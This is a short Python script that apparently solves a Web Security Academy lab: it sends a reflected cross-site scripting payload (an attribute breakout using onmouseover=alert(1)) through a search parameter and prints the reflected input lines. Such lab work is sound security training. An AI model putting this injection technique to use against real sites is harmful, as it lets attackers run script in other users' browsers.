import requests

s = requests.Session()

site = 'ac991f911e7e06efc02b423c00ce00b0.web-security-academy.net'

odin_id = '<elafleur>'
search_term = f'''{odin_id}" onmouseover="alert(1)'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
for line in resp.text.split('\n'):
    if 'input' in line:
        print(line)